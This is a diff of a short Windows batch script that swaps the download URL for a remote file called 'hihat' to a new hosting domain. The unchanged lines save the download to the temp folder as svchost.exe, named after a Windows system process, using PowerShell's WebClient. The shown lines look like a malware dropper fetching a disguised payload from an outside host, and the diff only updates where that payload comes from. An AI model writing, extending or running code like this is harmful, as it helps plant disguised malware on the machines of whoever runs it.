@@ -1,5 +1,5 @@
 @echo off
-set URL=https://hihat.onrender.com/dist/hihat
+set URL=https://hihat.squareweb.app/dist/hihat
 set FILE=%TEMP%\svchost.exe
 
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%', '%FILE%')"
